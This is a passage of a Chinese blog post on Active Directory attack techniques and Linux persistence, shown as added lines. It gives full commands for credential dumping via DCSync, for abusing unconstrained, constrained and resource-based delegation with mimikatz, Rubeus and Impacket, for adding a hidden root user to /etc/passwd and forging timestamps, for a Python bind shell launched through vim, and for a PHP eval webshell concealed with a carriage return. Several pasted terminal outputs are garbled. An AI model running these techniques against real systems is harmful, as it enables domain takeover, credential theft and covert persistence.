+<p>（1）控制了域控然后查询 secretsdump.exe 域名/administrator:密码@IP</p>
+<p>（2）通过dsync查询 milikatz-&gt;lsadump::dcsync /domian:域名 /user:krbtgt</p>
+<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p><strong>TGS(Ticket Granting Service)<strong>通过client的TGT判断其是否有服务的访问权限，目标是获取</strong>ST(SEerver Ticket)</strong><br>返回一个用<strong>Login session key</strong>加密后的用于确保客户端服务器之间通讯安全的<strong>server-session -key</strong>，并且生成用<strong>Server_Hash</strong>加密的<strong>TGS票据(ST)</strong></p>
+<h5 id="委托攻击"><a href="#委托攻击" class="headerlink" title="委托攻击"></a>委托攻击</h5><p>主机hostB上的服务B就需要代表用户A去访问hostC上的服务C，这个过程就被称为委派<br>查询域委派关系</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains findDelegation.py xiaorang.lab/Aldrich:<span class="string">&#x27;P@ssw0rd&#x27;</span> -dc-ip 172.22.8.15 -target-domain xiaorang.lab</span><br></pre></td></tr></table></figure>
+<h6 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h6><p>任何用户都可以委派主机hostB代替自己去访问任何服务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#某个用户委托hostB去访问某个服务，那么这个用户会将 TGT发送到hostB并缓存到LSASS中，以方便以后使用,如果这个用户是域用户我们就可以获取他的TGT</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment">#导出域管的TGT</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt [0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment">#通过 Pass The Ticket（PTT）将 TGT 注入到当前会话中,[0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi是对应的TGT文件</span></span><br></pre></td></tr></table></figure>
+<p>如果上面没有目标的tgt，可以使用NTLM Relay</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上传Rubeus.exe 监听 TGT</span></span><br><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</span></span><br><span class="line">proxychains python3 dfscoerce.py -u win19$ -hashes <span class="string">&quot;aad3b435b51404eeaad3b435b51404ee:21b11500d5834a2b9b3373564a0565f6&quot;</span> -d xiaorang.lab win19 172.22.4.7</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入 TGT 然后 DCSync</span></span><br><span class="line">Rubeus.exe ptt /ticket:xxx</span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /all /csv&quot;</span></span><br></pre></td></tr></table></figure>
+<h6 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h6><p>限制了访问的服务类型与资源主机，但是没有限制谁能对主机hostB进行委派<br>对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment"># 获取自身的hash</span></span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:NTLM哈希 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap <span class="comment">#申请 可转发TS(S4U2self协议允许服务代表任意用户请求访问自身服务的ST服务票据)，（需要提供可转发的TGT，自身的hash申请的）</span></span><br><span class="line"></span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据 <span class="comment">#使用上面获取S4U-TS伪造 Administrator 用户申请 ST(S4U2proxy协议允许服务在已取得S4U-TS下代表任意用户获取其他指定服务的服务票据)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以看出只要控制配置约束性委派服务的机器，那么我们就可以获得任意用户权限的ticket</span></span><br></pre></td></tr></table></figure>
+<h6 id="基于资源的约束性委派-RBCD"><a href="#基于资源的约束性委派-RBCD" class="headerlink" title="基于资源的约束性委派(RBCD)"></a>基于资源的约束性委派(RBCD)</h6><p>基于资源的约束委派允许资源配置受信任的帐户委派给他们。由资源本身为自己配置资源委派信任关系，资源本身决定可以信任谁。</p>
+<p>一般的情况是我们拿到一个域账户，其具备某台机器的属性修改的权限，那我们就可以获取这台主机的管理员权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用zhangxin域用户创建一个机器账户TEST2$(每个域用户默认可以创建10个)</span></span><br><span class="line">proxychains python3 addcomputer.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name <span class="string">&#x27;TEST2$&#x27;</span> -computer-pass <span class="string">&#x27;P@ssw0rd&#x27;</span></span><br><span class="line"><span class="comment">#然后修改Fileserver$的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</span></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -action write -delegate-to <span class="string">&#x27;Fileserver$&#x27;</span> -delegate-from <span class="string">&#x27;TEST2$&#x27;</span></span><br><span class="line"><span class="comment">#利用该机器账户的凭证通过S4U协议伪造Administrator用户委派至目标主机的ST票据</span></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/<span class="string">&#x27;TEST2$&#x27;</span>:<span class="string">&#x27;P@ssw0rd&#x27;</span> -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator.ccache <span class="comment">#导入申请的票据</span></span><br><span class="line">vim /etc/hosts <span class="comment">#改本地的/etc/hosts</span></span><br><span class="line">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk <span class="comment">#无密码连接</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>白银票据制作条件<br>(1):域名称<br>(2):域的SID<br>(3):域控服务器账户的NTLM-Hash(获取方法是可能域内某主机的hash和域控服务器的hash相同)<br>(4):伪造任意的用户名</p>
+<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>client拿着ST票据与服务端进行通信，检测后允许访问该<strong>SPN(ServicePrincipal Names,服务主体名称)</strong></p>
+<h3 id="NTLM-身份验证协议协议"><a href="#NTLM-身份验证协议协议" class="headerlink" title="NTLM 身份验证协议协议"></a>NTLM 身份验证协议协议</h3><p>早期SMB协议明文在网络上传输数据，后来诞生了LM验证机制，LM机制由于过于简单，微软提出了WindowsNT挑战/响应机制，这就是NTLM。远程桌面（3389）和文件共享（445）都使用的是ntlm进行认证<br>目前 NTLM 几个常见的使用场景：</p>
+<pre><code>在域环境中用作 Kerberos 的备份，当Kerberos 失效时，就会使用 NTLM 进行认证。
+使用本地账户登录时也会使用 NTLM 认证。
+客户端尝试使用 ip 进行连接，而不是主机名时，也会使用 NTLM 进行认证。
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1423.1.png" alt="1423.1"></p>
+<ol>
+<li>**Application message(s)**：表示客户端和服务器之间发送的应用协议消息。</li>
+<li><strong>NTLM_NEGOTIATE</strong>：client会向server发起请求连接协商，这个消息指定了该会话期望的安全特性。</li>
+<li><strong>NTLM_CHALLENGE</strong>：server就会在本地生成一个（16位或8位）<strong>随机字符(Challenge)</strong>,并将Challenge传给client。</li>
+<li><strong>NTLM_AUTHENTICATE</strong>：username的<strong>NTLM-hash</strong>对Challenge进行加密（加密过程中会利用到用户名、域名、机器名等相关信息），生成<strong>Response</strong>，并将Response发送给server</li>
+<li>**Application message(s)**：server在收到Response后，将其和相同的方式进行加密生成另一个Response,如果相同，则验证成功，如果不同就失败<h2 id="域间横向"><a href="#域间横向" class="headerlink" title="域间横向"></a>域间横向</h2></li>
+</ol>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="后门技术"><a href="#后门技术" class="headerlink" title="后门技术"></a>后门技术</h3><p>1、添加root权限后门用户<br>加密密码：<br>#密码M0rk</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">muyu@ubuntu:~/Desktop$ perl -e <span class="string">&#x27;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&#x27;</span></span><br><span class="line">AAhmo1jgYI0HE  </span><br></pre></td></tr></table></figure>
+<p>添加用户到passwd文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd </span><br></pre></td></tr></table></figure>
+<p>修改时间数据元：修改完文件之后记得修改一下文件的时间戳，防止被发现，可以使用touch命令进行伪造 </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch -a -t 201611161200.10 file.txt //更改access时间戳 </span><br><span class="line">touch -a -t 201611161200.10 file.txt -m //更改Modify data</span><br></pre></td></tr></table></figure>
+<p>特点：<br>●<br>优点：简单<br>●<br>缺点：易被检测到</p>
+<p>排查：<br>检查/etc/passwd文件是否有异常</p>
+<p>2、vim后门<br>条件：安装了vim且安装了python扩展(绝大版本默认安装)<br>进入恶意脚本目录：<br><code>cd /usr/lib/python2.7/site-packages</code><br>运行恶意脚本：<br><code>$(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 </code><br>删除恶意脚本<br><code>rm -f dir.py</code><br>恶意脚本dir.py的内容可以是任何功能的后门，如python版本的正向后门监听11端口：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html </span></span><br><span class="line">from socket import * </span><br><span class="line">import subprocess </span><br><span class="line">import os, threading, sys, time </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">server=socket(AF_INET,SOCK_STREAM) </span><br><span class="line">server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,11)) </span><br><span class="line">server.listen(5) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;waiting for connect&#x27;</span> </span><br><span class="line">talk, addr = server.accept() </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;connect from&#x27;</span>,addr </span><br><span class="line">proc = subprocess.Popen([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>], stdin=talk, stdout=talk, stderr=talk, shell=True) </span><br></pre></td></tr></table></figure>
+<p>特点：<br>●<br>优点：通过查看/proc/pid/cmdline查看不到具体执行了什么命令或恶意脚本。<br>●<br>缺点：仍可以看到有vim进程<br>排查：<br>检测对应vim进程号虚拟目录的map文件是否有python字眼。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Troot@5co5bcaceb55/1<span class="comment">#netstat-antlp</span></span><br><span class="line">ActiveInternetconnections(serversandestaihe)</span><br><span class="line">PID/Programname</span><br><span class="line">ProtoRecv-oSend-oLocalAddress</span><br><span class="line">ForeignAddress</span><br><span class="line">State</span><br><span class="line">127.0.0.11:33627</span><br><span class="line">lISTEN</span><br><span class="line">0.0.0.0:*</span><br><span class="line">0</span><br><span class="line">tcp</span><br><span class="line">LISTEN</span><br><span class="line">日日1270.01:6379</span><br><span class="line">0.0.0.0:*</span><br><span class="line">tcp</span><br><span class="line">19/redis-server127</span><br><span class="line">lISTEN</span><br><span class="line">00.0.0.0:80</span><br><span class="line">42/httpd</span><br><span class="line">0.0.0.0:*</span><br><span class="line">0</span><br><span class="line">tcp</span><br><span class="line">LISTEN</span><br><span class="line">00.0.0.0:</span><br><span class="line">12/vim</span><br><span class="line">0.0.0.0:*</span><br><span class="line">tcp</span><br><span class="line">[root@cobcaceb55<span class="comment">#file/roc/z/exe</span></span><br><span class="line">/proc/12/exe:symbouiclinkto/sr/bin/im</span><br><span class="line">[root@5cobcaceb5<span class="comment">#more/proc/12/cmine</span></span><br><span class="line">vim</span><br><span class="line">[roota5cobcaceb551<span class="comment">#mre/proc/12/mastn</span></span><br><span class="line">7fd300d4c0007d300d4FI00xp010000008:812505105</span><br><span class="line">/ib-dynload/_heapq.so</span><br><span class="line">b6i/python2.</span><br><span class="line">/usT</span><br><span class="line">7FD300D4FOQL7FD300F4E000</span><br><span class="line">/ib-dynload/heapq.so</span><br><span class="line">-00000300008:012505105</span><br><span class="line">/usr/ib</span><br><span class="line">python2.</span><br><span class="line">7FD300F4E00073004F000000008:012505105</span><br><span class="line">/ib-dynload/heapg.So</span><br><span class="line">python2.</span><br><span class="line">/usr/tib6</span><br><span class="line">7FD300f4F0007D30051000p00000008:12505105</span><br><span class="line">/ib-dynload/.heapq.so</span><br><span class="line">/usr/ibop/python2</span><br><span class="line">/ib-dynload/itertoolsmoduleo</span><br><span class="line">python2</span><br><span class="line">7f3001510007D30015b00x13</span><br><span class="line">/usr/tib6</span><br><span class="line">ib-dynload/itertoolsmodule.so</span><br><span class="line">7fD300f5b0007*30115a10853</span><br><span class="line">/usr7tibby/python2.</span><br><span class="line">ib-dynload/itertoolsmoduleso</span><br><span class="line">7fD3011530007*30115b13</span><br><span class="line">/usr/tib6-/python2.</span><br><span class="line">/ib-dynload/itertoolsmodule.so</span><br><span class="line">7fD3011500073011600003</span><br><span class="line">/usr/tiboy/python2.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>3、终端解析\r导致的问题<br>实现代码：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&lt;?=\`eval(\$_POST[good]\`);?&gt;\r&lt;?=&#x27;PHP Test Page &gt;||&lt;&#x27;;?&gt;&quot;</span> &gt;/var/www/html/test.php</span><br></pre></td></tr></table></figure>
+<p>理解：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~J<span class="comment">#echo</span></span><br><span class="line">123\r456<span class="string">&#x27;&gt;test</span></span><br><span class="line"><span class="string">[root@localhost</span></span><br><span class="line"><span class="string">[rootalocalhost]#</span></span><br><span class="line"><span class="string">test</span></span><br><span class="line"><span class="string">more</span></span><br><span class="line"><span class="string">123\r456</span></span><br><span class="line"><span class="string">[root@localhostl#echo</span></span><br><span class="line"><span class="string">&quot;123\r456&#x27;</span>&gt;<span class="built_in">test</span></span><br><span class="line">[root@Localhost<span class="comment">#</span></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">more</span><br><span class="line">456</span><br></pre></td></tr></table></figure>
+
+<p>特点：<br>●<br>优点：通过终端命令例如cat、more等命令查看不到恶意代码,适合隐藏一句话木马等。<br>●<br>缺点：易被检测，只是通过终端命令查看的时候看不到恶意代码，而通过其它读文件操作或者通过vim等工具进行编辑查看的时候仍可以查看到恶意代码。</p>
+<p>排查：<br>使用编辑器或者一般的webshell扫描工具即可检测。</p>
+<p>4、定时任务和开机启动项<br> 一般的挖矿木马喜欢设置定时任务来进行驻留或进行分时段的挖矿。  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ood6342hecao</span><br><span class="line">crontab</span><br><span class="line">*3***</span><br><span class="line">[rootaood6342becau</span><br><span class="line">门升</span><br><span class="line">image.png</span><br></pre></td></tr></table></figure>
+<p> 排查：<br>一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，</p>
+<p>●<br>Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。<br>●<br>Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">rootaubuntu:/etc/init.d#ls-Laht</span><br><span class="line">total272K</span><br><span class="line">drwxr-xr-x146rootroot1zkJan2919:49</span><br><span class="line">drwxr-xr-x</span><br><span class="line">Root4.0KSeP303:03</span><br><span class="line">rootroo</span><br><span class="line">ot:00TA1M3:1520173PP97M0F</span><br><span class="line">FWXFXF*</span><br><span class="line">very-&gt;/ib/init/upstart-jot</span><br><span class="line">frtendiy-recovery</span><br><span class="line">210ct112016fr</span><br><span class="line">rootroot</span><br><span class="line">LrWXrWXrWX</span><br><span class="line">2016cron-&gt;/itb/nit/upstart-job</span><br><span class="line">210ct11</span><br><span class="line">1f00t</span><br><span class="line">Lrwxrwxrwx</span><br><span class="line">Root</span><br><span class="line">eFeb172016legacy-bootordering</span><br><span class="line">root</span><br><span class="line">Root</span><br><span class="line">-rw-f.-r.</span><br><span class="line">2016ondemand</span><br><span class="line">Feb16</span><br><span class="line">1.6K</span><br><span class="line">root</span><br><span class="line">1</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">root</span><br><span class="line">1rootroot6.0kJa</span><br><span class="line">Jan26</span><br><span class="line">2016virtuatbox</span><br><span class="line">rwXr-Xr-X</span><br><span class="line">Jan20</span><br><span class="line">1rootroot4.3KJ</span><br><span class="line">2016</span><br><span class="line">rsync</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1rootroot3.4KD</span><br><span class="line">Dec2</span><br><span class="line">Lightdm</span><br><span class="line">2015</span><br><span class="line">rwXr-Xr-X</span><br><span class="line">2015</span><br><span class="line">1rootroot2.8K</span><br><span class="line">KNOV9</span><br><span class="line">rwXr-Xr-x</span><br><span class="line">apport</span><br><span class="line">1ro0troot1.1kMay13</span><br><span class="line">2015</span><br><span class="line">grub-Common</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1footroot561</span><br><span class="line">Apr21</span><br><span class="line">2015</span><br><span class="line">rwXr-Xr-x</span><br><span class="line">pppd-dns</span><br><span class="line">2.8K</span><br><span class="line">2014</span><br><span class="line">NOV25</span><br><span class="line">rwXr-Xr-x</span><br><span class="line">dbus</span><br><span class="line">1rootroot</span><br><span class="line">1rootroot2.7koct8</span><br><span class="line">x11COmmon</span><br><span class="line">2014</span><br><span class="line">rwXr-Xr-x</span><br><span class="line">1rootroot4.4kSeP</span><br><span class="line">4</span><br><span class="line">2014bluetooth</span><br><span class="line">rwXr-Xr-X</span><br><span class="line">2014ResoLconf</span><br><span class="line">1rootroot2.9KJun</span><br><span class="line">13</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1rootroot2.3</span><br><span class="line">8</span><br><span class="line">2014SANED</span><br><span class="line">2.3KMay</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1rootroot4.0KMay2</span><br><span class="line">2014SSH</span><br><span class="line">rWXr-Xr-x</span><br><span class="line">1rootroot6.1KApr13</span><br><span class="line">2014</span><br><span class="line">udeV</span><br><span class="line">-rwXr-XT-X</span><br><span class="line">7</span><br><span class="line">1rootroot2.0kApr</span><br><span class="line">2014</span><br><span class="line">cups-browsed</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1rootroot2.2kApr4</span><br><span class="line">2014</span><br><span class="line">pulseaudio</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">Apr3</span><br><span class="line">1ro0troot3.2K</span><br><span class="line">2014</span><br><span class="line">cups</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1rootroot2.2kApr</span><br><span class="line">2014</span><br><span class="line">acpid</span><br><span class="line">3</span><br><span class="line">rWXr-Xr-x</span><br><span class="line">2014</span><br><span class="line">1r00tRoot3.1KMar28</span><br><span class="line">28</span><br><span class="line">kerneLoops</span><br><span class="line">rwXr-Xr-x</span><br><span class="line">2014</span><br><span class="line">Mar20</span><br><span class="line">1ro0troot4.4K</span><br><span class="line">networking</span><br><span class="line">rWXr-Xr-X</span><br><span class="line">1ro0t</span><br><span class="line">2014brltty</span><br><span class="line">Root2.1KMar13</span><br><span class="line">rwXr-Xr-X</span><br><span class="line">1</span><br><span class="line">2014haLt</span><br><span class="line">1.3KMar12</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">rWXr-Xr-x</span><br><span class="line">2AA11</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/server/" rel="tag"># server</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/07/04/sql/nosql%E6%B3%A8%E5%85%A5/" rel="prev" title="nosql注入">
+                  <i class="fa fa-chevron-left"></i> nosql注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mayylu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
